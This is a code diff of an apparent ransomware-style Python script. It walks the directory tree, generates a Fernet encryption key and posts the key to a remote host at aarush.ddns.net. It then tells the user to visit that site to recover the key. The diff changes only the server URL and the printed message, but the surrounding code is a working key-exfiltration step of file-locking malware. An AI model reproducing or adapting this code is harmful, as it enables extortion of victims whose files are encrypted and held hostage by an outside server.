@@ -27,13 +27,13 @@ for root, dirs, filenames in os.walk("."):
 key = Fernet.generate_key()
 
 # Send the key to a remote server
-server_url = 'http://aarush.ddns.net:4998/store_key'
+server_url = 'https://aarush.ddns.net/key/store_key'
 try:
     response = requests.post(server_url, data=key)  # Send raw bytes
     if response.status_code == 200:
         print(response.text)  # Display unique ID
         
-        print("Please go to aarush.ddns.net and enter the key above then save it to a file called thekey.key in the directory you ran this script\n")
+        print("Please go to aarush.ddns.net/key and enter the key above then save it to a file called thekey.key in the directory you ran this script\n")
     else:
         print(f"Failed to send the key to the server. Status Code: {response.status_code}")
 except requests.exceptions.RequestException as e:
